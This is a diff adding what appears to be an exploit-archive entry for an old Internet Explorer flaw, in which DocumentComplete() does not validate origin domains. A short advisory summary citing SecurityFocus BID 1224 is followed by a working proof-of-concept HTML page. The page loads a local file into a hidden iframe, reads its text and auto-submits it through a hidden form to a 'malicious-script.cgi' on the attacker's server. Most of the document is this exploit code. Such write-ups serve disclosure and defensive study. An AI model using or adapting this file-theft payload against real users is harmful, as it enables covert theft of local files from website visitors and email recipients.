@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/1224/info
+
+The DocumentComplete() function in IE does not properly validate origin domains.
+
+Therefore it is possible for a remote webserver to gain read access to local files on the machine of any website visitor or email recipient by accessing the browser object of a frame containing local content. Only files that can be opened by a browser window (eg. *.htm, *.js, *.txt etc) are viewable, and the path and name of the file must be known by the attacker.
+
+Update (May 16, 2001): A new variant of this vulnerability has been discovered. Microsoft has released a new patch to address all known variants of this vulnerability. 
+
+<iframe id=clientContent width=0 height=0 noborder>
+</iframe>
+<script for=clientContent event="DocumentComplete(browser)">
+alert (browser.document.body.innerText);
+
+// browser is an instance of the IWebBrowser COM object
+
+document.forms[0].elements[0].value = browser.document.body.innerText;
+document.forms[0].submit ();
+
+</script>
+
+<script>
+clientContent.navigate("c:\\known_file.txt")
+</script>
+<form action="/cgi/malicious-script.cgi" method=post onSubmit="window.alert(document.forms[0].elements[0].value); return
+true">
+<input name="file_text" type=hidden>
+</form> 
